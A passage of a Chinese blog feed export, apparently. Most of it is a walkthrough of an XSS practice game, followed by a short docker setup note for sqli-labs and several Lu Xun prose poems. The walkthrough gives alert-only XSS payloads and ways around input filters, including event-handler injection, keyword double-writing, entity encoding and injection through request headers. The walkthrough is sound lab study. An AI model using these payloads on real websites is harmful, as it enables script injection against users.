class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:26<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure> 可以发现上一关注入的位置同样对'&lt;&gt;'进行了过滤.因此我们采用另一种方式将其构造为如下形式 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert()&#x27;</span> &gt;</span></span><br></pre></td></tr></table></figure> 因此paylod为 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span>alert()</span><br></pre></td></tr></table></figure> 输入,提交.然后在点击一下那个输入框来触发onclick事件.过关.</p>
<h2 id="level-4">Level 4</h2>
<p><img src="/note/xss/4-1.png"> 提交上一关的payload,右键查看源码.结果如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;     </span></span><br><span class="line"><span class="javascript">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level4<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和&#x27; onclick=&#x27;alert()相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level4.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27; onclick=&#x27;alert()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">搜索</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level4.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:18<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure> 发现其value处的单引号变成了双引号 于是将上一关payload中的单引号替换为双引号 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span>alert()</span><br></pre></td></tr></table></figure> 输入,提交,点击输入框.过关</p>
<h2 id="level-5">Level 5</h2>
<p><img src="/note/xss/5-1.png"></p>
<p>提交上一关的payload,右键查看源码.结果如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;     </span></span><br><span class="line"><span class="javascript">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level5<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level5<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;quot;</span> onclick=<span class="symbol">&amp;quot;</span>alert()相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level5.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">o_nclick</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">搜索</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level5.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:19<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure> 发现其对某些关键字进行了过滤<strong>onclick</strong>被替换为<strong>o_nclick</strong> <strong>script</strong>也同样惨遭毒手,变成了<strong>scr_ipt</strong> 多次尝试后发现这一关并没有在<strong>value</strong>处对'&lt;&gt;'进行过滤,于是构造payload如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert()</span>&gt;</span>点击进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">color</span>=<span class="string">&quot;red</span></span></span><br></pre></td></tr></table></figure> 输入,提交,点击连接.过关</p>
<h2 id="level-6">Level 6</h2>
<p><img src="/note/xss/6-1.png"> 上一关payload带入尝试,无果. 经过若干次尝试后,发现诸如<strong>onload</strong>,<strong>onerror</strong>,<strong>herf</strong>等词均被过滤,考虑进行绕过. 由于html不对字母大小写写做区分,因此将上一关payload中的<strong>href</strong>改为<strong>HREF</strong>,如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">HREF</span>=<span class="string">javascript:alert()</span>&gt;</span>点击进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">color</span>=<span class="string">&quot;red</span></span></span><br></pre></td></tr></table></figure> 输入,提交后结果如下 <img src="/note/xss/6-2.png"> 点击链接后进入下一关</p>
<h2 id="level-7">Level 7</h2>
<p><img src="/note/xss/7-1.png"> 带入上一关payload后发现<strong>HREF</strong>被直接删除,如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">a</span> =<span class="string">java:alert()</span>&gt;</span>点击进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure> 同样会被删除的还有<strong>on</strong>,<strong>script</strong>等词 这关依旧考察绕过.我们可以将<strong>HREF</strong>改写为H<strong>HREF</strong>REF 这样一来当payload中的<strong>HREF</strong>被删除后剩余部分会构成一个新的<strong>HREF</strong>,<strong>script</strong>同理. 因此构造payload如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">MISSION COMPLETE！&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">HHREFREF</span>=<span class="string">javasscriptcript:alert()</span>&gt;</span>点击进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">color</span>=<span class="string">&quot;red</span></span></span><br></pre></td></tr></table></figure> &gt; payload写的过于花里胡哨ヾ(≧▽≦*)o</p>
<p>提交后结果如下 <img src="/note/xss/7-2.png"> 点击进入下一关即可</p>
<h2 id="level-8">Level 8</h2>
<p><img src="/note/xss/8-1.png"> 这一关在外观上发生了一定变化,所提交的内容会参与构成下方的链接,具体情况如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;nice try&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure> 可以看到我们所提交的内容出现在了<strong>&lt;a&gt;</strong>的herf属性中,于是尝试构造如下内容 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert()&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure> 当提交payload后,会发现这关对<strong>script</strong>进行过滤.并且也会将引号转换为对应的实体字符使得我们无法闭合<strong>herf</strong>属性,因此我们要在<strong>herf</strong>属性内解决问题。这里将<strong>Script</strong>内的部分字母写为&amp;# + 其对应的ascii码，如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">java<span class="symbol">&amp;#115;</span>cript:alert()</span><br></pre></td></tr></table></figure>
<p>经浏览器转换后构成</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert()&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击即可进入下一关</p>
<h2 id="level-9">Level 9</h2>
<p><img src="/note/xss/9-1.png"></p>
<p>开局进行各种尝试，都发现了这么一行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;您的链接不合法？有没有！&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>于是随手找了个网页链接丢进去，结果还是说链接不合法。</p>
<p>无奈之下</p>
<figure>
<img src="/note/xss/9-2.png" alt="image-20210902095855111"><figcaption aria-hidden="true">image-20210902095855111</figcaption>
</figure>
<p>.</p>
<p>..</p>
<p>...</p>
<p>.....................................</p>
<p><img src="/note/xss/9-3.jpg"></p>
<p>这个东西里面竟然必须含有<strong>http://</strong>(之前输入的那个网址是<strong>HTTPS</strong>协议的)。。。。。。</p>
<p>最后七拼八凑出了这么一个<strong>payload</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">java&amp;#115cript:alert(&#x27;http://&#x27;)</span><br></pre></td></tr></table></figure>
<p>点击链接过关</p>
<blockquote>
<p><strong>http://</strong>竟然可以不在开头。。。。 这关多少是有点狗</p>
</blockquote>
<h2 id="level-10">Level 10</h2>
<figure>
<img src="/note/xss/10-1.png" alt="10-1"><figcaption aria-hidden="true">10-1</figcaption>
</figure>
<p>熟悉的<strong>input</strong>栏不见了（梦回第二关）</p>
<p>从上一关跳转过来后这关的<strong>url</strong>为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://xssaq.com/yx/level10.php?keyword=well done!</span><br></pre></td></tr></table></figure>
<p>胡乱试了半天，并没有发现注入点</p>
<p>最终查看页面代码发现以下内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后把<strong>keyword</strong>换成<strong>t_link</strong>,<strong>t_history</strong>,<strong>t_sort</strong>逐一测试,最终发现可对<strong>t_sort</strong>的<strong>value</strong>属性进行注入</p>
<p>于是便得到了,它</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">t_sort=MISSION COMPLETE！&quot;  type=&quot;text&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>记得要点一下文本框</p>
</blockquote>
<h2 id="level-11">Level 11</h2>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRscriptIPT</span>&gt;</span>’”()Oonnjavascript</span><br></pre></td></tr></table></figure>
<p><img src="/note/xss/11-1.png"></p>
<p>测试后发现上一关的注入点已经被拦截。</p>
<p>查看源码后发现相较上关多出了如下内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;https://xssaq.com/yx/level10.php?name=test&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里推测后端会读取请求报文中的<strong>Refere</strong></p>
<p>于是打开<strong>Burp Suite </strong>抓包进行分析（其他工具也可）,可得如下报文（注意 <strong>Referer</strong>）</p>
<p><img src="/note/xss/11-2.png"></p>
<p>对第十关的<strong>payload</strong>进行改写，把<strong>Referer</strong>的值改为如下即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">MISSION COMPLETE&quot; type=&quot;text&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>
<p>点击文本框进入下一关</p>
<h2 id="level-12">Level 12</h2>
<p><img src="/note/xss/12-1.png"></p>
<p>查看源代码，发现如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ua&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>ua</strong>结合上一关，盲猜这关是改<strong>User-Agent</strong></p>
<p>上一关payload直接过。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">MISSION COMPLETE&quot; type=&quot;text&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>
<h2 id="level-13">Level 13</h2>
<p><img src="/note/xss/13-1.png"></p>
<p>查看源代码，发现如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_cook&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;call me maybe?&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结合抓包的结果,从哪里注入已经很清楚了</p>
<p><img src="/note/xss/13-2.png"></p>
<p>payload依旧没变，直接过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">MISSION COMPLETE&quot; type=&quot;text&quot; onclick=&quot;alert()</span><br></pre></td></tr></table></figure>
<h2 id="level-14">Level 14</h2>
<p>图片加载不出来，过</p>
<h2 id="level-15">Level 15</h2>
<p><img src="/note/xss/15-1.png"></p>
<p>照旧，查看源代码，可得如下内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;     </span></span><br><span class="line"><span class="javascript">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level15<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到第15关，自己想个办法走出去吧！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level15.png</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;ng-include:1.gif&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里发现作者引入了<strong>Angularjs</strong>(不过用的是谷歌的cdn，所以某些网络问题懂的都懂)</p>
<p>简易了解<strong>Angularjs</strong>语法后发现这个</p>
<p><img src="/note/xss/15-2.png"></p>
<p>尝试用这个语法引入之前关卡的php文件(顺带提交之前的payload)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://xssaq.com/yx/level15.php?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert()</span>&gt;</span>MISSION COMPLETE<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>随便引入那关都可以，按照之前过关的方法再过一遍就行</p>
</blockquote>
<h2 id="level-16">Level 16</h2>
<p><img src="/note/xss/16-1.png"></p>
<p>这关会过滤空格，所以我们用回车来替代空格</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">keyword=&lt;button%0donclick=alert()&gt;</span><br></pre></td></tr></table></figure>
<h2 id="end">End</h2>
<p>后面的都是<strong>flash</strong>的<strong>xss</strong>,手头没环境，过。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lib</title>
    <url>/note//sqli-lib.html</url>
    <content><![CDATA[<h1 id="sqli-lib的安装"><strong>sqli-lib</strong>的安装</h1>
<p>这里使用<strong>docker</strong>来安装</p>
<p>首先安装<strong>docker</strong></p>
<span id="more"></span>
<p><strong>Linux</strong>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
<p><img src="/note/sqli-lib/1.png"></p>
<p>其他包管理器自行解决</p>
<p><strong>Windows</strong>：</p>
<p>官网下载安装程序，自行安装（较麻烦）。推荐用linux。</p>
<p><strong>docker</strong>安装完成后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker search sqli-labs</span><br></pre></td></tr></table></figure>
<p><img src="/note/sqli-lib/2.png"></p>
<p>这里下载的是第一个</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker pull  acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
<p><img src="/note/sqli-lib/3.png"></p>
<p>等他下完就好</p>
<p>如果下载过慢就换源</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sqli-lib</tag>
      </tags>
  </entry>
  <entry>
    <title>战士和苍蝇</title>
    <url>/note//%E6%88%98%E5%A3%AB%E5%92%8C%E8%8B%8D%E8%9D%87.html</url>
    <content><![CDATA[<p>Schopenhauer说过这样的话：要估定人的伟大，则精神上的大和体格上的大，那法则完全相反。后者距离愈远即愈小，前者却见得愈大。 <span id="more"></span> 　　正因为近则愈小，而且愈看见缺点和创伤，所以他就和我们一样，不是神道，不是妖怪，不是异兽。他仍然是人，不过如此。但也惟其如此，所以他是伟大的人。</p>
<p>　　战士战死了的时候，苍蝇们所首先发见的是他的缺点和伤痕，嘬着，营营地叫着，以为得意，以为比死了的战士更英雄。但是战士已经战死了，不再来挥去他们。于是乎苍蝇们即更其营营地叫，自以为倒是不朽的声音，因为它们的完全，远在战士之上。</p>
<p>　　的确的，谁也没有发见过苍蝇们的缺点和创伤。</p>
<p>　　然而，有缺点的战士终竟是战士，完美的苍蝇也终竟不过是苍蝇。</p>
<p>　　去罢，苍蝇们！虽然生着翅子，还能营营，总不会超过战士的。你们这些虫豸们！</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>鲁迅</tag>
      </tags>
  </entry>
  <entry>
    <title>墓碣文</title>
    <url>/note//%E5%A2%93%E7%A2%A3%E6%96%87.html</url>
    <content><![CDATA[<p>我梦见自己正和墓碣对立，读着上面的刻辞。那墓碣似是沙石所制，剥落很多，又有苔藓丛生，仅存有限的文句—— <span id="more"></span> “……于浩歌狂热之际中寒；于天上看见深渊。于一切眼中看见无所有；于无所希望中得救。……</p>
<p>“……有一游魂，化为长蛇，口有毒牙。不以啮人，自啮其身，终以陨颠。……</p>
<p>“……离开！……”</p>
<p>我绕到碣后，才见孤坟，上无草木，且已颓坏。即从大阙口中，窥见死尸，胸腹俱破，中无心肝。而脸上却绝不显哀乐之状，但蒙蒙如烟然。</p>
<p>我在疑惧中不及回身，然而已看见墓碣阴面的残存的文句——</p>
<p>“……抉心自食，欲知本味。创痛酷烈，本味何能知？……</p>
<p>“……痛定之后，徐徐食之。然其心已陈旧，本味又何由知？……</p>
<p>“……答我。否则，离开！……”</p>
<p>我就要离开。而死尸已在坟中坐起，口唇不动，然而说——</p>
<p>“待我成尘时，你将见我的微笑！”</p>
<p>我疾走，不敢反顾，生怕看见他的追随</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>鲁迅</tag>
      </tags>
  </entry>
  <entry>
    <title>影的告别</title>
    <url>/note//%E5%BD%B1%E7%9A%84%E5%91%8A%E5%88%AB.html</url>
    <content><![CDATA[<p>人睡到不知道时候的时候，就会有影来告别，说出那些话──</p>
<p>　　有我所不乐意的在地狱里，我不愿去；有我所不乐意的在地狱里，我不愿去；有我所不乐意的在你们将来的黄金世界里，我不愿去。</p>
<p>　　然而你就是我所不乐意的。 <span id="more"></span> 　　朋友，我不想跟随你，我不愿住。</p>
<p>　　我不愿意！</p>
<p>　　呜乎呜乎，我不愿意，我不如彷徨于无地。</p>
<p>　　我不过一个影，要别你而沉没在黑暗里了。然而黑暗又会吞并我，然而光明又会使我消失。</p>
<p>　　然而我不愿彷徨于明暗之间，我不如在黑暗里沉没。</p>
<p>　　然而我终于彷徨于明暗之间，我不知道是黄昏还是黎明。我姑且举灰黑的手装作喝干一杯酒，我将在不知道时候的时候独自远行。</p>
<p>　　呜乎呜乎，倘若黄昏，黑夜自然会来沉没我，否则我要被白天消失，如果现是黎明。</p>
<p>　　朋友，时候近了。</p>
<p>　　我将向黑暗里彷徨于无地。</p>
<p>　　你还想我的赠品。我能献你甚么呢？无已，则仍是黑暗和虚空而已。但是，我愿意只是黑暗，或者会消失于你的白天；我愿意只是虚，决不占你的心地。</p>
<p>　　我愿意这样，朋友──</p>
<p>　　我独自远行，不但没有你，并且再没有别的影在黑暗里。只有我被黑暗沉没，那世界全属于我自己。</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>鲁迅</tag>
      </tags>
  </entry>
  <entry>
    <title>死火</title>
    <url>/note//%E6%AD%BB%E7%81%AB.html</url>
    <content><![CDATA[<p>我梦见自己在冰山间奔驰。</p>
<p>这是高大的冰山，上接冰天，天上冻云弥漫，片片如鱼鳞模样。山麓有冰树林，枝叶都如松杉。一切冰冷，一切青白。</p>
<p>但我忽然坠在冰谷中。 <span id="more"></span> 上下四旁无不冰冷，青白。而一切青白冰上，却有红影无数，纠结如珊瑚网。我俯看脚下，有火焰在。</p>
<p>这是死火。有炎炎的形，但毫不摇动，全体冰结，像珊瑚枝;尖端还有凝固的黑烟，疑这才从火宅中出，所以枯焦。这样，映在冰的四壁，而且互相反映，化为无量数影，使这冰谷，成红珊瑚色。</p>
<p>哈哈!</p>
<p>当我幼小的时候，本就爱看快舰激起的浪花，洪炉喷出的烈焰。不但爱看，还想看清。可惜他们都息息变幻，永无定形。虽然凝视又凝视，总不留下怎样一定的迹象。</p>
<p>死的火焰，现在先得到了你了!</p>
<p>我拾起死火，正要细看，那冷气已使我的指头焦灼;但是，我还熬着，将他塞入衣袋中间。冰谷四面，登时完全青白。我一面思索着走出冰谷的法子。</p>
<p>我的身上喷出一缕黑烟，上升如铁线蛇。冰谷四面，又登时满有红焰流动，如大火聚，将我包围。我低头一看，死火已经燃烧，烧穿了我的衣裳，流在冰地上了。</p>
<p>“唉，朋友! 你用了你的温热，将我惊醒了。”他说。</p>
<p>我连忙和他招呼，问他名姓。</p>
